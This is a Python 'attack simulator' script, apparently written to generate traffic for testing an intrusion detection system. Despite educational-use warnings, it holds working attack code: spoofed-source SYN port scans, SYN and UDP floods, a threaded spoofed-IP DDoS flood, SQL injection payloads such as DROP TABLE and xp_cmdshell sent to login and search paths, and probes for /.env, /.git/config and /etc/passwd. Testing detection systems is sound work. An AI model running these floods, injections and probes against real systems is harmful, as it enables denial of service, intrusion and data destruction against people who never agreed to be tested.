"""
=============================================================
  AI-IPS Full Attack Simulator
=============================================================
  FOR EDUCATIONAL / IDS TESTING PURPOSES ONLY.
  Run ONLY against systems you own or have explicit
  written permission to test.
=============================================================
  Attack Modes:
    1.  portscan       — TCP SYN scan across many ports
    2.  bruteforce     — Rapid repeated connections (SSH/FTP/RDP)
    3.  sqli           — HTTP requests with SQL injection payloads
    4.  dos            — Single-source packet flood (DoS)
    5.  ddos           — Multi-threaded spoofed-source flood (DDoS sim)
    6.  netpenetration — Reconnaissance + service probing
    7.  all            — Run every attack in sequence

  Usage (must run as Administrator / root):
    python simulate_attacks_full.py --target <IP> --mode <mode>
=============================================================
"""

import argparse
import random
import socket
import sys
import time
import threading
import os
import http.client
import urllib.parse

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

# ── Colour helpers ────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def banner(title: str):
    print(f"\n{BOLD}{CYAN}{'='*60}{RESET}")
    print(f"{BOLD}{CYAN}  {title}{RESET}")
    print(f"{BOLD}{CYAN}{'='*60}{RESET}")

def info(msg):  print(f"{GREEN}[INFO]{RESET}  {msg}")
def warn(msg):  print(f"{YELLOW}[WARN]{RESET}  {msg}")
def attack(msg):print(f"{RED}[ATTACK]{RESET} {msg}")
def ok(msg):    print(f"{GREEN}[OK]{RESET}    {msg}")


# ── Utility ───────────────────────────────────────────────────────────────────

def get_local_ip() -> str:
    """Detect local outbound IP."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def random_private_ip() -> str:
    """Generate a random RFC-1918 IP to use as spoofed source."""
    choice = random.randint(0, 2)
    if choice == 0:
        return f"10.{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
    elif choice == 1:
        return f"172.{random.randint(16,31)}.{random.randint(0,254)}.{random.randint(1,254)}"
    else:
        return f"192.168.{random.randint(0,254)}.{random.randint(1,254)}"


def scapy_available() -> bool:
    try:
        import scapy.all  # noqa: F401
        return True
    except ImportError:
        return False


# ─────────────────────────────────────────────────────────────────────────────
#  1. PORT SCAN SIMULATION
# ─────────────────────────────────────────────────────────────────────────────

def simulate_port_scan(target: str, src_ip: str, count: int = 150):
    """
    TCP SYN scan — sends SYN packets to `count` random ports.
    Uses Scapy if available; falls back to raw socket connect().
    """
    banner("PORT SCAN SIMULATION")
    attack(f"Source : {src_ip}  →  Target : {target}")
    attack(f"Probing {count} ports with SYN packets ...")

    ports = random.sample(range(1, 65535), min(count, 5000))

    if scapy_available():
        from scapy.all import IP, TCP, send
        pkts = [
            IP(src=src_ip, dst=target) /
            TCP(sport=random.randint(1024, 65535), dport=p, flags="S")
            for p in ports
        ]
        batch = 25
        for i in range(0, len(pkts), batch):
            send(pkts[i:i+batch], verbose=False)
            print(f"  Sent {min(i+batch, len(pkts))}/{len(pkts)} SYN pkts", end="\r")
            time.sleep(0.08)
    else:
        warn("Scapy not found — using connect() scan (no spoofing)")
        open_ports = []
        for p in ports[:200]:   # limit to 200 for connect scan
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                result = s.connect_ex((target, p))
                if result == 0:
                    open_ports.append(p)
                    info(f"  Port {p} OPEN")
                s.close()
            except Exception:
                pass
        info(f"Open ports found: {open_ports}")

    ok(f"Port scan complete — {len(ports)} ports probed.")


# ─────────────────────────────────────────────────────────────────────────────
#  2. BRUTE FORCE SIMULATION
# ─────────────────────────────────────────────────────────────────────────────

# Sample credential wordlists (for traffic simulation only)
USERNAMES = ["admin","root","user","test","guest","administrator","pi","ubuntu","oracle","postgres"]
PASSWORDS = ["password","123456","admin","root","toor","letmein","pass","qwerty","abc123","welcome"]

def simulate_brute_force(target: str, src_ip: str, port: int = 22, count: int = 300):
    """
    Simulates a brute-force attack by hammering a single port
    with rapid TCP SYN / connection attempts.
    """
    banner("BRUTE FORCE SIMULATION")
    service_names = {22: "SSH", 21: "FTP", 23: "Telnet", 3389: "RDP",
                     5900: "VNC", 3306: "MySQL", 5432: "PostgreSQL"}
    svc = service_names.get(port, f"Port {port}")
    attack(f"Source : {src_ip}  →  Target : {target}:{port} ({svc})")
    attack(f"Sending {count} rapid connection attempts ...")

    if scapy_available():
        from scapy.all import IP, TCP, send
        pkts = [
            IP(src=src_ip, dst=target) /
            TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
            for _ in range(count)
        ]
        batch = 40
        for i in range(0, len(pkts), batch):
            send(pkts[i:i+batch], verbose=False)
            cred_idx = (i // batch) % len(USERNAMES)
            print(f"  Attempt {min(i+batch, count)}/{count}  "
                  f"[{USERNAMES[cred_idx]}:{PASSWORDS[cred_idx]}]", end="\r")
            time.sleep(0.04)
    else:
        warn("Scapy not found — using socket connect() attempts")
        for i in range(count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect_ex((target, port))
                s.close()
            except Exception:
                pass
            print(f"  Attempt {i+1}/{count}", end="\r")
            time.sleep(0.02)

    ok(f"\nBrute force complete — {count} attempts sent.")


# ─────────────────────────────────────────────────────────────────────────────
#  3. SQL INJECTION TRAFFIC SIMULATION
# ─────────────────────────────────────────────────────────────────────────────

SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users;--",
    "' UNION SELECT null,username,password FROM users--",
    "1' AND SLEEP(5)--",
    "admin'--",
    "' OR 'x'='x",
    "1; SELECT * FROM information_schema.tables--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    "1 UNION ALL SELECT NULL,NULL,NULL--",
    "' OR 1=1 LIMIT 1--",
    "'; EXEC xp_cmdshell('whoami');--",
    "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
    "1' ORDER BY 3--",
]

SQL_PATHS = [
    "/login.php", "/search.php", "/products.php",
    "/user.php", "/admin/", "/api/v1/users",
    "/index.php?id=", "/shop/item.php?id=",
]

def simulate_sql_injection(target: str, port: int = 80, count: int = 30):
    """
    Sends HTTP GET/POST requests containing SQLi payloads to a web target.
    Generates realistic IDS-triggering web traffic — no actual exploit occurs
    unless the target is vulnerable.
    """
    banner("SQL INJECTION TRAFFIC SIMULATION")
    attack(f"Target : http://{target}:{port}")
    attack(f"Sending {count} HTTP requests with SQL injection payloads ...")

    # ── Pre-flight check: is the web server actually running? ──
    try:
        test_conn = http.client.HTTPConnection(target, port, timeout=3)
        test_conn.request("GET", "/")
        test_conn.getresponse()
        test_conn.close()
    except ConnectionRefusedError:
        print()
        warn("=" * 60)
        warn(f"  TARGET NOT REACHABLE: http://{target}:{port}")
        warn("  The demo web app is NOT running!")
        warn("  Start it first (in a separate Admin terminal):")
        warn(f"    python scripts\\demo_webapp.py")
        warn("  Then re-run this simulation.")
        warn("=" * 60)
        return
    except Exception as e:
        warn(f"  Pre-flight check failed: {e}")

    sent = 0
    for i in range(count):
        payload   = random.choice(SQL_PAYLOADS)
        path_base = random.choice(SQL_PATHS)
        encoded   = urllib.parse.quote(payload)

        try:
            conn = http.client.HTTPConnection(target, port, timeout=3)

            # Alternate GET and POST
            if i % 2 == 0:
                url = f"{path_base}?id={encoded}&user={encoded}"
                conn.request(
                    "GET", url,
                    headers={
                        "User-Agent": "Mozilla/5.0 SQLiScanner/1.0",
                        "X-Forwarded-For": random_private_ip(),
                    }
                )
            else:
                body = urllib.parse.urlencode({
                    "username": payload,
                    "password": payload,
                    "search":   payload,
                })
                conn.request(
                    "POST", path_base, body=body,
                    headers={
                        "Content-Type":  "application/x-www-form-urlencoded",
                        "User-Agent":    "Mozilla/5.0 SQLiScanner/1.0",
                        "X-Forwarded-For": random_private_ip(),
                    }
                )

            resp = conn.getresponse()
            status_color = "[OK]   " if resp.status == 403 else "[INFO] "
            info(f"  [{i+1:>3}/{count}] {path_base[:30]:<32} -> HTTP {resp.status}")
            conn.close()
            sent += 1
        except ConnectionRefusedError:
            warn(f"  [{i+1:>3}/{count}] Server stopped responding - is demo_webapp.py still running?")
            break
        except Exception as e:
            warn(f"  [{i+1:>3}/{count}] Error: {e}")
        time.sleep(0.15)

    ok(f"SQL injection simulation complete - {sent}/{count} requests sent.")



# ─────────────────────────────────────────────────────────────────────────────
#  4. DoS SIMULATION (Single-source packet flood)
# ─────────────────────────────────────────────────────────────────────────────

def simulate_dos(target: str, src_ip: str, port: int = 80,
                 count: int = 1000, use_udp: bool = False):
    """
    Simulates a Denial-of-Service attack from a single source.
    Sends a large volume of SYN (TCP) or UDP packets very rapidly.
    """
    banner("DoS ATTACK SIMULATION")
    proto = "UDP" if use_udp else "TCP SYN"
    attack(f"Source : {src_ip}  →  Target : {target}:{port}")
    attack(f"Flooding with {count} {proto} packets ...")

    if scapy_available():
        from scapy.all import IP, TCP, UDP, Raw, send

        if use_udp:
            pkts = [
                IP(src=src_ip, dst=target) /
                UDP(sport=random.randint(1024, 65535), dport=port) /
                Raw(load=os.urandom(random.randint(64, 512)))
                for _ in range(count)
            ]
        else:
            pkts = [
                IP(src=src_ip, dst=target) /
                TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
                for _ in range(count)
            ]

        batch = 100
        start = time.time()
        total_sent = 0
        for i in range(0, len(pkts), batch):
            send(pkts[i:i+batch], verbose=False)
            total_sent = min(i+batch, count)
            elapsed = time.time() - start
            rate = total_sent / elapsed if elapsed > 0 else 0
            print(f"  Sent {total_sent}/{count}  ({rate:.0f} pkt/s)", end="\r")
            time.sleep(0.005)

        elapsed = time.time() - start
    else:
        warn("Scapy not available — using raw socket flood")
        start = time.time()
        total_sent = 0
        for i in range(count):
            try:
                if use_udp:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(os.urandom(256), (target, port))
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.1)
                    s.connect_ex((target, port))
                s.close()
                total_sent += 1
            except Exception:
                pass
        elapsed = time.time() - start

    rate = total_sent / elapsed if elapsed > 0 else 0
    ok(f"\nDoS complete — {total_sent} pkts in {elapsed:.1f}s ({rate:.0f} pkt/s)")


# ─────────────────────────────────────────────────────────────────────────────
#  5. DDoS SIMULATION (Multi-threaded, spoofed sources)
# ─────────────────────────────────────────────────────────────────────────────

_ddos_lock   = threading.Lock()
_ddos_total  = 0
_ddos_stop   = threading.Event()

def _ddos_worker(target: str, port: int, pkts_per_thread: int, thread_id: int):
    global _ddos_total
    if scapy_available():
        from scapy.all import IP, TCP, send
        for _ in range(pkts_per_thread):
            if _ddos_stop.is_set():
                break
            src = random_private_ip()
            pkt = IP(src=src, dst=target) / TCP(
                sport=random.randint(1024, 65535),
                dport=port, flags="S"
            )
            send(pkt, verbose=False)
            with _ddos_lock:
                _ddos_total += 1
            time.sleep(0.002)
    else:
        for _ in range(pkts_per_thread):
            if _ddos_stop.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.2)
                s.connect_ex((target, port))
                s.close()
                with _ddos_lock:
                    _ddos_total += 1
            except Exception:
                pass
            time.sleep(0.01)


def simulate_ddos(target: str, port: int = 80,
                  threads: int = 10, pkts_per_thread: int = 100,
                  duration: int = 20):
    """
    Simulates a Distributed DoS — spawns `threads` worker threads,
    each sending from a different spoofed source IP.
    Runs for `duration` seconds or until all packets are sent.
    """
    global _ddos_total, _ddos_stop
    _ddos_total = 0
    _ddos_stop.clear()

    banner("DDoS ATTACK SIMULATION")
    attack(f"Target : {target}:{port}")
    attack(f"Threads : {threads}  |  Pkts/thread : {pkts_per_thread}  |  Duration : {duration}s")
    if not scapy_available():
        warn("Scapy not found — using socket connect() (no IP spoofing)")

    workers = []
    for t in range(threads):
        th = threading.Thread(
            target=_ddos_worker,
            args=(target, port, pkts_per_thread, t),
            daemon=True
        )
        workers.append(th)

    start = time.time()
    for th in workers:
        th.start()

    # Progress monitor
    while any(th.is_alive() for th in workers):
        elapsed = time.time() - start
        if elapsed >= duration:
            _ddos_stop.set()
            break
        with _ddos_lock:
            sent = _ddos_total
        rate = sent / elapsed if elapsed > 0 else 0
        print(f"  DDoS running … {sent} pkts  {rate:.0f} pkt/s  {elapsed:.0f}/{duration}s", end="\r")
        time.sleep(0.5)

    for th in workers:
        th.join(timeout=3)

    elapsed = time.time() - start
    rate = _ddos_total / elapsed if elapsed > 0 else 0
    ok(f"\nDDoS complete — {_ddos_total} total pkts in {elapsed:.1f}s ({rate:.0f} pkt/s)")


# ─────────────────────────────────────────────────────────────────────────────
#  6. NETWORK PENETRATION SIMULATION
# ─────────────────────────────────────────────────────────────────────────────

COMMON_PORTS = [21,22,23,25,53,80,110,111,135,139,143,443,
                445,993,995,1723,3306,3389,5900,8080,8443]

BANNER_GRAB_PORTS = [21, 22, 25, 80, 110, 143, 443, 3306, 5432]

def _banner_grab(target: str, port: int, timeout: float = 2.0):
    """Attempt to grab a service banner."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target, port))
        s.sendall(b"\r\n")
        banner_data = s.recv(256)
        s.close()
        return banner_data.decode(errors="replace").strip()[:80]
    except Exception:
        return None


def simulate_network_penetration(target: str, src_ip: str):
    """
    Simulates a reconnaissance-driven penetration test sequence:
      Phase 1 — Host discovery (ICMP ping via Scapy or socket)
      Phase 2 — Port scan on well-known ports
      Phase 3 — Service/banner grabbing
      Phase 4 — OS fingerprinting hint (TTL analysis)
      Phase 5 — Vulnerability probe (common weak paths)
    """
    banner("NETWORK PENETRATION SIMULATION")
    attack(f"Source : {src_ip}  →  Target : {target}")

    # Phase 1 — Host Discovery
    print(f"\n{YELLOW}[Phase 1]{RESET} Host Discovery ...")
    if scapy_available():
        from scapy.all import IP, ICMP, sr1
        pkt = IP(dst=target) / ICMP()
        resp = sr1(pkt, timeout=2, verbose=False)
        if resp:
            info(f"  Host {target} is UP (ICMP reply received, TTL={resp.ttl})")
            ttl = resp.ttl
        else:
            warn(f"  No ICMP reply from {target} (host may be filtering pings)")
            ttl = None
    else:
        try:
            socket.setdefaulttimeout(2)
            socket.gethostbyaddr(target)
            info(f"  Host {target} resolved — likely UP")
        except Exception:
            warn(f"  Could not resolve {target}")
        ttl = None

    # Phase 2 — Port Scan
    print(f"\n{YELLOW}[Phase 2]{RESET} Scanning {len(COMMON_PORTS)} common ports ...")
    open_ports = []
    if scapy_available():
        from scapy.all import IP, TCP, sr1
        for p in COMMON_PORTS:
            pkt  = IP(src=src_ip, dst=target) / TCP(
                sport=random.randint(1024,65535), dport=p, flags="S"
            )
            resp = sr1(pkt, timeout=1, verbose=False)
            if resp and resp.haslayer("TCP") and resp["TCP"].flags == 0x12:
                open_ports.append(p)
                info(f"  Port {p:>5} OPEN")
            time.sleep(0.05)
    else:
        for p in COMMON_PORTS:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((target, p)) == 0:
                open_ports.append(p)
                info(f"  Port {p:>5} OPEN")
            s.close()
            time.sleep(0.03)

    if not open_ports:
        warn("  No open ports detected.")
    else:
        ok(f"  Open ports: {open_ports}")

    # Phase 3 — Banner Grabbing
    print(f"\n{YELLOW}[Phase 3]{RESET} Banner grabbing on open ports ...")
    for p in [p for p in BANNER_GRAB_PORTS if p in open_ports]:
        b = _banner_grab(target, p)
        if b:
            info(f"  Port {p:>5}: {b}")
        else:
            warn(f"  Port {p:>5}: no banner")
        time.sleep(0.2)

    # Phase 4 — OS Fingerprint hint
    print(f"\n{YELLOW}[Phase 4]{RESET} OS Fingerprinting (TTL heuristic) ...")
    if ttl:
        if ttl >= 128:
            info(f"  TTL={ttl} → Likely Windows")
        elif ttl >= 64:
            info(f"  TTL={ttl} → Likely Linux/macOS")
        elif ttl >= 255:
            info(f"  TTL={ttl} → Likely Cisco/Network device")
        else:
            info(f"  TTL={ttl} → Unknown OS")
    else:
        warn("  TTL data unavailable — skipping OS hint")

    # Phase 5 — Vulnerability Probes
    print(f"\n{YELLOW}[Phase 5]{RESET} Probing common vulnerability paths ...")
    vuln_paths = [
        "/admin", "/phpmyadmin", "/.env", "/wp-admin/",
        "/config.php", "/backup/", "/shell.php",
        "/.git/config", "/etc/passwd", "/api/v1/admin",
    ]
    if 80 in open_ports or 8080 in open_ports:
        web_port = 80 if 80 in open_ports else 8080
        for vp in vuln_paths:
            try:
                conn = http.client.HTTPConnection(target, web_port, timeout=2)
                conn.request("GET", vp, headers={
                    "User-Agent": "PenTestBot/1.0",
                    "X-Forwarded-For": random_private_ip(),
                })
                r = conn.getresponse()
                status_color = GREEN if r.status == 200 else YELLOW
                print(f"  {status_color}{r.status}{RESET}  {vp}")
                conn.close()
            except Exception as e:
                warn(f"  Error probing {vp}: {e}")
            time.sleep(0.1)
    else:
        warn("  Port 80/8080 not open — skipping HTTP vulnerability probes")

    ok("\nNetwork penetration simulation complete.")


# ─────────────────────────────────────────────────────────────────────────────
#  7. ALL ATTACKS
# ─────────────────────────────────────────────────────────────────────────────

def simulate_all(target: str, src_ip: str):
    banner("FULL ATTACK SUITE — ALL MODES")
    attack(f"Target={target}  Source={src_ip}")
    print()

    simulate_port_scan(target, src_ip, count=100)
    time.sleep(3)

    simulate_brute_force(target, src_ip, port=22, count=200)
    time.sleep(3)

    simulate_sql_injection(target, port=80, count=20)
    time.sleep(3)

    simulate_dos(target, src_ip, port=80, count=500)
    time.sleep(3)

    simulate_ddos(target, port=80, threads=6, pkts_per_thread=80, duration=15)
    time.sleep(3)

    simulate_network_penetration(target, src_ip)

    banner("ALL ATTACK SIMULATIONS COMPLETE")
    ok(f"Check your IDS dashboard and logs for detected threats.")


# ─────────────────────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────────────────────

MODES = ["portscan", "bruteforce", "sqli", "dos", "ddos", "netpenetration", "all"]

def main():
    parser = argparse.ArgumentParser(
        description="AI-IPS Full Attack Simulator — FOR IDS TESTING ONLY",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="\n".join([
            "Modes:",
            "  portscan       TCP SYN scan across random ports",
            "  bruteforce     Rapid connection flood to a single port",
            "  sqli           HTTP requests with SQL injection payloads",
            "  dos            Single-source packet flood",
            "  ddos           Multi-threaded spoofed-source flood",
            "  netpenetration Recon + port scan + banner grab + vuln probe",
            "  all            Run every attack sequentially",
        ])
    )
    parser.add_argument("--target",  "-t", default=None,
                        help="Target IP (default: local machine)")
    parser.add_argument("--source",  "-s", default=None,
                        help="Spoofed source IP (default: random private IP)")
    parser.add_argument("--mode",    "-m", choices=MODES, default="all",
                        help="Attack mode (default: all)")
    parser.add_argument("--count",   "-c", type=int, default=200,
                        help="Packet/request count per attack (default: 200)")
    parser.add_argument("--port",    "-p", type=int, default=80,
                        help="Target port for single-port attacks (default: 80)")
    parser.add_argument("--threads", type=int, default=8,
                        help="DDoS thread count (default: 8)")
    parser.add_argument("--duration",type=int, default=20,
                        help="DDoS duration in seconds (default: 20)")
    parser.add_argument("--udp",     action="store_true",
                        help="Use UDP flood for DoS (default: TCP SYN)")
    parser.add_argument("--yes",     "-y", action="store_true",
                        help="Skip confirmation prompt")

    args   = parser.parse_args()
    # IMPORTANT: Default to real outbound IP, NOT 127.0.0.1
    # Scapy on Windows cannot capture loopback traffic.
    # Traffic must go through the physical/virtual NIC to be detected.
    target = args.target or get_local_ip()
    if target in ("127.0.0.1", "localhost", "::1"):
        warn("WARNING: You specified loopback (127.0.0.1).")
        warn("Scapy CANNOT capture loopback traffic on Windows!")
        warn(f"Switching target to your real IP: {get_local_ip()}")
        target = get_local_ip()
    src    = args.source or random_private_ip()

    banner("AI-IPS ATTACK SIMULATOR")
    print(f"  Target  : {target}")
    print(f"  Source  : {src}")
    print(f"  Mode    : {args.mode}")
    print(f"  Count   : {args.count}")
    print(f"  Port    : {args.port}")
    print(f"  Scapy   : {'YES' if scapy_available() else 'NO (fallback mode)'}")
    print()
    warn("FOR EDUCATIONAL / IDS TESTING USE ONLY.")
    warn("Only target systems you own or have explicit written permission to test.")

    if not args.yes:
        confirm = input("\nProceed with simulation? (y/n): ").strip().lower()
        if confirm != "y":
            print("Aborted.")
            return

    dispatch = {
        "portscan":       lambda: simulate_port_scan(target, src, args.count),
        "bruteforce":     lambda: simulate_brute_force(target, src, args.port, args.count),
        "sqli":           lambda: simulate_sql_injection(target, args.port, args.count),
        "dos":            lambda: simulate_dos(target, src, args.port, args.count, args.udp),
        "ddos":           lambda: simulate_ddos(target, args.port, args.threads,
                                                 args.count, args.duration),
        "netpenetration": lambda: simulate_network_penetration(target, src),
        "all":            lambda: simulate_all(target, src),
    }
    dispatch[args.mode]()


if __name__ == "__main__":
    main()
